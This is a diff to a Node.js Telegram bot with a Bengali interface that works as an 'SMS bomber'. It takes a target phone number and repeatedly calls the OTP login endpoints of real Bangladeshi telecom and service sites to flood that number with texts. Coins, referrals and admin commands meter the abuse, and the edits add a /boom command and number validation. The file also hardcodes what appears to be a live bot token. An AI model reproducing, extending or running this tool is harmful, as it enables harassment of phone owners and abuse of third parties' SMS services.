@@ -7,10 +7,9 @@ const BOT_TOKEN = '8452171958:AAFElgfh2yXz7VurqsOBZD3AJIpvTCB8GmE';
 const ADMIN_ID = 5967798239;
 const bot = new Telegraf(BOT_TOKEN);
 
-// Database Files
+// Database Setup
 const DATA_DIR = './database';
 if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR);
-
 const DB_FILE = `${DATA_DIR}/users.json`;
 const HISTORY_FILE = `${DATA_DIR}/history.json`;
 const RN_FILE = `${DATA_DIR}/restricted.json`;
@@ -27,10 +26,10 @@ function saveData() {
 
 // Render server
 const app = express();
-app.get('/', (req, res) => res.send('Bot Status: Online'));
+app.get('/', (req, res) => res.send('Bot is Running!'));
 app.listen(process.env.PORT || 3000);
 
-// API List (Same as before)
+// API List (পূর্বের সকল API এখানে থাকবে)
 const SMS_APIS = [
     { url: "https://robiwifi-mw.robi.com.bd/fwa/api/v1/customer/auth/otp/login", method: "POST", headers: { 'Content-Type': 'application/json', 'Referer': 'https://robiwifi.robi.com.bd/' }, data: p => ({ login: p }) },
     { url: "https://weblogin.grameenphone.com/backend/api/v1/otp", method: "POST", headers: { 'Content-Type': 'application/json' }, data: p => ({ msisdn: p }) },
@@ -80,165 +79,68 @@ const SMS_APIS = [
 
 bot.use(session());
 
-// Keyboards
 const mainMenu = Markup.keyboard([
     ['🚀 Boom', '💰 Balance'],
     ['🎁 Daily Bonus', 'ℹ️ Info']
 ]).resize();
 
-// Helper Functions
-async function autoDelete(ctx, msgId, delay = 600000) {
+// Helpers
+async function autoDelete(ctx, msgId, delay = 300000) {
     setTimeout(async () => {
         try { await ctx.telegram.deleteMessage(ctx.chat.id, msgId); } catch (e) {}
     }, delay);
 }
 
-function isBanned(uid) {
-    if (userData[uid]?.bannedUntil && userData[uid].bannedUntil > Date.now()) return true;
-    return false;
-}
-
 function registerUser(ctx) {
     const uid = ctx.from.id;
     if (!userData[uid]) {
-        userData[uid] = { 
-            name: ctx.from.first_name, 
-            coins: 50, 
-            lastBonus: 0, 
-            totalRequests: 0, 
-            bannedUntil: 0 
-        };
+        userData[uid] = { name: ctx.from.first_name, coins: 50, lastBonus: 0, totalRequests: 0, bannedUntil: 0 };
         saveData();
         return true;
     }
     return false;
 }
 
-// Start Command & Referral
+function isBanned(uid) {
+    return userData[uid]?.bannedUntil > Date.now();
+}
+
+// Commands & Handlers
 bot.start(async (ctx) => {
     const uid = ctx.from.id;
     const isNew = registerUser(ctx);
-    
-    // Referral Logic
     const refBy = ctx.startPayload;
     if (isNew && refBy && userData[refBy] && refBy != uid) {
         userData[refBy].coins += 100;
-        ctx.telegram.sendMessage(refBy, `🎊 আপনার রেফার লিংকে নতুন ইউজার যুক্ত হয়েছে! আপনি ১০০ কয়েন পেয়েছেন।`);
-        saveData();
+        ctx.telegram.sendMessage(refBy, `🎊 নতুন রেফারেল! আপনি ১০০ কয়েন পেয়েছেন।`);
     }
-
-    const welcomeMsg = await ctx.reply(`👋 স্বাগতম ${ctx.from.first_name}!\nআপনার UID: <code>${uid}</code>\nরেফার লিংক: <code>https://t.me/${ctx.botInfo.username}?start=${uid}</code>`, { parse_mode: 'HTML', ...mainMenu });
-    autoDelete(ctx, ctx.message.message_id, 300000);
+    const msg = await ctx.reply(`👋 স্বাগতম ${ctx.from.first_name}!\nআপনার UID: <code>${uid}</code>\nরেফার লিংক: <code>https://t.me/${ctx.botInfo.username}?start=${uid}</code>`, { parse_mode: 'HTML', ...mainMenu });
+    autoDelete(ctx, ctx.message.message_id);
+    autoDelete(ctx, msg.message_id);
 });
 
-// Help Command
-bot.command('help', async (ctx) => {
-    const helpText = `🛠 **কমান্ড লিস্ট:**\n/start - শুরু করুন\n/boom - বোম্বিং শুরু\n/balance - ব্যালেন্স দেখুন\n/ck - ডেইলি বোনাস (৫০ কয়েন)\n/history - আপনার হিস্টরি\n/info - আইডি তথ্য\n\n🛡 **এডমিন কমান্ড:**\n/recharge <uid> <amount>\n/ban <uid> <days>\n/uban <uid>\n/list user - ইউজার লিস্ট\n/rn <number> - নম্বর নিষিদ্ধ\n/list rn - নিষিদ্ধ তালিকা\n/history - গ্লোবাল হিস্টরি\n\n👤 Admin: @Tnayem48`;
-    const msg = await ctx.reply(helpText, { parse_mode: 'Markdown' });
-    if(ctx.from.id === ADMIN_ID) autoDelete(ctx, msg.message_id, 300000);
-});
+// Balance Command & Button
+const sendBalance = async (ctx) => {
+    registerUser(ctx);
+    const msg = await ctx.reply(`💰 ব্যালেন্স: ${userData[ctx.from.id].coins} কয়েন`);
+    autoDelete(ctx, ctx.message.message_id);
+    autoDelete(ctx, msg.message_id);
+};
+bot.command('balance', sendBalance);
+bot.hears('💰 Balance', sendBalance);
 
-// Admin Broadcast
-bot.command('broadcast', async (ctx) => {
-    if (ctx.from.id !== ADMIN_ID) return;
-    ctx.session = { step: 'broadcast_msg' };
-    ctx.reply("📢 ব্রডকাস্ট মেসেজটি লিখুন (ছবিসহ পাঠাতে পারেন):");
-});
+// Info Command & Button
+const sendInfo = async (ctx) => {
+    registerUser(ctx);
+    const msg = await ctx.reply(`👤 নাম: ${ctx.from.first_name}\n🆔 UID: <code>${ctx.from.id}</code>\n🚀 মোট রিকোয়েস্ট: ${userData[ctx.from.id].totalRequests}\n👤 এডমিন: @Tnayem48`, { parse_mode: 'HTML' });
+    autoDelete(ctx, ctx.message.message_id);
+    autoDelete(ctx, msg.message_id);
+};
+bot.command('info', sendInfo);
+bot.hears('ℹ️ Info', sendInfo);
 
-// Admin Recharge
-bot.command('recharge', async (ctx) => {
-    if (ctx.from.id !== ADMIN_ID) return;
-    const args = ctx.message.text.split(' ');
-    if (args.length !== 3) return ctx.reply("Usage: /recharge uid amount");
-    const target = args[1];
-    const amount = parseInt(args[2]);
-    if (userData[target]) {
-        userData[target].coins += amount;
-        saveData();
-        ctx.reply(`✅ ইউজার ${target} এর অ্যাকাউন্টে ${amount} কয়েন আপডেট করা হয়েছে।`);
-    }
-});
-
-// History Command
-bot.command('history', async (ctx) => {
-    const uid = ctx.from.id;
-    let records = [];
-    if (uid === ADMIN_ID) {
-        records = historyData.slice(-10).reverse();
-    } else {
-        records = historyData.filter(h => h.uid === uid).slice(-10).reverse();
-    }
-
-    if (records.length === 0) return ctx.reply("📭 কোনো হিস্টরি পাওয়া যায়নি।");
-    
-    let text = "📜 **সর্বশেষ ১০টি রেকর্ড:**\n\n";
-    records.forEach((r, i) => {
-        text += `${i+1}. 📱 ${r.phone} | 🔢 ${r.amount} | 🕒 ${new Date(r.time).toLocaleString('en-GB')}\n`;
-    });
-    ctx.reply(text, { parse_mode: 'Markdown' });
-});
-
-// Restricted Numbers Logic
-bot.command('rn', (ctx) => {
-    if (ctx.from.id !== ADMIN_ID) return;
-    const input = ctx.message.text.split(' ')[1];
-    if (!input) return;
-
-    if (input.startsWith('-')) {
-        const num = input.substring(1);
-        restrictedNumbers = restrictedNumbers.filter(n => n !== num);
-        ctx.reply(`✅ ${num} নিষিদ্ধ তালিকা থেকে বাদ দেওয়া হয়েছে।`);
-    } else {
-        restrictedNumbers.push(input);
-        ctx.reply(`🚫 ${input} নম্বরটি নিষিদ্ধ করা হয়েছে।`);
-    }
-    saveData();
-});
-
-bot.command('list', (ctx) => {
-    if (ctx.from.id !== ADMIN_ID) return;
-    const type = ctx.message.text.split(' ')[1];
-    if (type === 'rn') {
-        ctx.reply(`🚫 **নিষিদ্ধ নম্বর তালিকা:**\n${restrictedNumbers.join('\n') || 'তালিকা খালি'}`);
-    } else if (type === 'user') {
-        let list = "👥 **ইউজার লিস্ট:**\n";
-        Object.keys(userData).forEach(uid => {
-            list += `👤 ${userData[uid].name} | ID: <code>${uid}</code> | 💰 ${userData[uid].coins} | 🚀 ${userData[uid].totalRequests}\n`;
-        });
-        ctx.reply(list, { parse_mode: 'HTML' });
-    }
-});
-
-// Ban / Unban
-bot.command('ban', (ctx) => {
-    if (ctx.from.id !== ADMIN_ID) return;
-    const args = ctx.message.text.split(' ');
-    const target = args[1];
-    const days = parseInt(args[2]) || 365;
-    if (userData[target]) {
-        userData[target].bannedUntil = Date.now() + (days * 24 * 60 * 60 * 1000);
-        saveData();
-        ctx.reply(`🚫 ইউজার ${target} কে ${days} দিনের জন্য ব্যান করা হয়েছে।`);
-    }
-});
-
-bot.command('uban', (ctx) => {
-    if (ctx.from.id !== ADMIN_ID) return;
-    const target = ctx.message.text.split(' ')[1];
-    if (userData[target]) {
-        userData[target].bannedUntil = 0;
-        saveData();
-        ctx.reply(`✅ ইউজার ${target} কে আনব্যান করা হয়েছে।`);
-    }
-});
-
-// Bonus & Info Handlers
-bot.command('ck', (ctx) => handleBonus(ctx));
-bot.hears('🎁 Daily Bonus', (ctx) => handleBonus(ctx));
-bot.hears('💰 Balance', (ctx) => ctx.reply(`💰 আপনার বর্তমান ব্যালেন্স: ${userData[ctx.from.id]?.coins || 0} কয়েন`));
-bot.hears('ℹ️ Info', (ctx) => ctx.reply(`👤 নাম: ${ctx.from.first_name}\n🆔 UID: <code>${ctx.from.id}</code>\n🚀 মোট রিকোয়েস্ট: ${userData[ctx.from.id]?.totalRequests || 0}\n👤 এডমিন: @Tnayem48`, { parse_mode: 'HTML' }));
-
-async function handleBonus(ctx) {
+// Bonus Command & Button
+const sendBonus = async (ctx) => {
     const uid = ctx.from.id;
     if (isBanned(uid)) return ctx.reply("❌ আপনি ব্যান হয়ে আছেন!");
     const diff = (Date.now() - (userData[uid].lastBonus || 0)) / (1000 * 60 * 60);
@@ -246,96 +148,102 @@ async function handleBonus(ctx) {
         userData[uid].coins += 50;
         userData[uid].lastBonus = Date.now();
         saveData();
-        ctx.reply("✅ অভিনন্দন! আপনি ৫০ কয়েন বোনাস পেয়েছেন।");
+        ctx.reply("✅ ৫০ কয়েন বোনাস পেয়েছেন!");
     } else {
-        ctx.reply(`❌ দয়া করে ${(24 - diff).toFixed(1)} ঘণ্টা পর চেষ্টা করুন।`);
+        ctx.reply(`❌ ${(24 - diff).toFixed(1)} ঘণ্টা পর চেষ্টা করুন।`);
     }
-}
+};
+bot.command('ck', sendBonus);
+bot.hears('🎁 Daily Bonus', sendBonus);
 
-// Bombing Flow
-bot.hears('🚀 Boom', (ctx) => {
-    if (isBanned(ctx.from.id)) return ctx.reply("❌ আপনি ব্যান হয়ে আছেন!");
+// Boom Logic
+const startBoomWorkflow = async (ctx) => {
+    if (isBanned(ctx.from.id)) return ctx.reply("❌ আপনি ব্যান!");
     ctx.session = { step: 'get_phone' };
     ctx.reply("📱 বোম্বিং নম্বরটি দিন:");
+};
+
+bot.command('boom', async (ctx) => {
+    const args = ctx.message.text.split(' ');
+    if (args.length === 3) {
+        startBombing(ctx, args[1], parseInt(args[2]));
+    } else {
+        startBoomWorkflow(ctx);
+    }
 });
+bot.hears('🚀 Boom', startBoomWorkflow);
 
 bot.command('bm', (ctx) => {
-    if (isBanned(ctx.from.id)) return ctx.reply("❌ আপনি ব্যান হয়ে আছেন!");
     const args = ctx.message.text.split(' ');
     if (args.length === 3) startBombing(ctx, args[1], parseInt(args[2]));
 });
 
-// Text & Message Handler
-bot.on('message', async (ctx) => {
-    const uid = ctx.from.id;
-    
-    // Broadcast Handle
-    if (uid === ADMIN_ID && ctx.session?.step === 'broadcast_msg') {
-        let count = 0;
-        const users = Object.keys(userData);
-        for (let user of users) {
-            try {
-                if (ctx.message.photo) {
-                    await ctx.telegram.sendPhoto(user, ctx.message.photo[0].file_id, { caption: ctx.message.caption });
-                } else {
-                    await ctx.telegram.sendMessage(user, ctx.message.text);
-                }
-                count++;
-            } catch (e) {}
-        }
-        ctx.reply(`📢 ব্রডকাস্ট সম্পন্ন! মোট ${count} জন ইউজার পেয়েছে।`);
-        ctx.session = {};
-        return;
-    }
+// Admin Commands
+bot.command('recharge', (ctx) => {
+    if (ctx.from.id !== ADMIN_ID) return;
+    const args = ctx.message.text.split(' ');
+    const target = args[1], amount = parseInt(args[2]);
+    if (userData[target]) { userData[target].coins += amount; saveData(); ctx.reply("✅ আপডেট হয়েছে।"); }
+});
 
-    // Boom Step Handle
-    if (ctx.session?.step === 'get_phone') {
-        ctx.session.phone = ctx.message.text;
-        ctx.session.step = 'get_amount';
-        ctx.reply("🔢 পরিমাণ দিন (১-১০০):");
-    } else if (ctx.session?.step === 'get_amount') {
-        startBombing(ctx, ctx.session.phone, parseInt(ctx.message.text));
-        ctx.session = {};
-    }
+bot.command('rn', (ctx) => {
+    if (ctx.from.id !== ADMIN_ID) return;
+    const input = ctx.message.text.split(' ')[1];
+    if (input.startsWith('-')) restrictedNumbers = restrictedNumbers.filter(n => n !== input.substring(1));
+    else restrictedNumbers.push(input);
+    saveData(); ctx.reply("✅ নিষিদ্ধ তালিকা আপডেট হয়েছে।");
+});
+
+bot.command('history', (ctx) => {
+    const uid = ctx.from.id;
+    const records = (uid === ADMIN_ID ? historyData : historyData.filter(h => h.uid === uid)).slice(-10).reverse();
+    let text = "📜 **হিস্টরি:**\n";
+    records.forEach(r => text += `• ${r.phone} | ${r.amount} | ${new Date(r.time).toLocaleTimeString()}\n`);
+    ctx.reply(text, { parse_mode: 'Markdown' });
 });
 
 // Main Bombing Function
 async function startBombing(ctx, phone, amount) {
     const uid = ctx.from.id;
-    if (restrictedNumbers.includes(phone)) return ctx.reply("❌ দুঃখিত, এই নম্বরটি এডমিন দ্বারা প্রটেক্টেড।");
+    if (restrictedNumbers.includes(phone)) return ctx.reply("❌ এই নম্বরটি প্রটেক্টেড!");
     if (userData[uid].coins < amount) return ctx.reply("❌ পর্যাপ্ত কয়েন নেই!");
-    if (isNaN(amount) || amount > 100) return ctx.reply("❌ ভুল পরিমাণ (সর্বোচ্চ ১০০)।");
+    if (isNaN(amount) || amount > 100) return ctx.reply("❌ সর্বোচ্চ ১০০টি সম্ভব।");
 
-    const statusMsg = await ctx.reply(`🚀 কাজ শুরু হয়েছে (${phone})...`);
+    const statusMsg = await ctx.reply(`🚀 ${phone} নম্বরে কাজ শুরু...`);
     let success = 0, errors = 0, apiIdx = 0;
 
-    // Fast Loop
     while (success < amount) {
         const api = SMS_APIS[apiIdx % SMS_APIS.length];
         apiIdx++;
         try {
-            const config = {
-                method: api.method, url: api.url, headers: api.headers || {}, timeout: 5000,
-                [api.method === 'POST' ? 'data' : 'params']: api.method === 'POST' ? api.data(phone) : api.params(phone)
-            };
-            await axios(config);
-            success++;
+            const config = { method: api.method, url: api.url, headers: api.headers || {}, timeout: 5000,
+                [api.method === 'POST' ? 'data' : 'params']: api.method === 'POST' ? api.data(phone) : api.params(phone) };
+            await axios(config); success++;
         } catch (e) { errors++; }
-        await new Promise(r => setTimeout(r, 100));
-        if (apiIdx > amount + 200) break;
+        await new Promise(r => setTimeout(r, 150));
+        if (apiIdx > amount + 300) break;
     }
 
     userData[uid].coins -= amount;
     userData[uid].totalRequests += 1;
     historyData.push({ uid, phone, amount, time: Date.now() });
     saveData();
-
-    const finalMsg = await ctx.reply(`✅ সম্পন্ন!\n🎯 সফল: ${success}\n⚠️ ব্যর্থ: ${errors}\n💰 বর্তমান ব্যালেন্স: ${userData[uid].coins}`, mainMenu);
-    
-    // Auto Clean
-    autoDelete(ctx, ctx.message.message_id, 300000);
-    autoDelete(ctx, statusMsg.message_id, 300000);
-    autoDelete(ctx, finalMsg.message_id, 300000);
+    const finalMsg = await ctx.reply(`✅ সম্পন্ন!\n🎯 সফল: ${success}\n⚠️ ব্যর্থ: ${errors}\n💰 ব্যালেন্স: ${userData[uid].coins}`);
+    autoDelete(ctx, statusMsg.message_id); autoDelete(ctx, finalMsg.message_id);
 }
 
-bot.launch().then(() => console.log("Bot started with full features!"));
+// Global Text Handler for Workflow
+bot.on('message', async (ctx) => {
+    if (ctx.session?.step === 'get_phone') {
+        if (/^01[3-9]\d{8}$/.test(ctx.message.text)) {
+            ctx.session.phone = ctx.message.text;
+            ctx.session.step = 'get_amount';
+            ctx.reply("🔢 পরিমাণ দিন (১-১০০):");
+        } else ctx.reply("❌ সঠিক নম্বর দিন।");
+    } else if (ctx.session?.step === 'get_amount') {
+        startBombing(ctx, ctx.session.phone, parseInt(ctx.message.text));
+        ctx.session = {};
+    }
+});
+
+bot.launch().then(() => console.log("Bot Updated & Running!"));
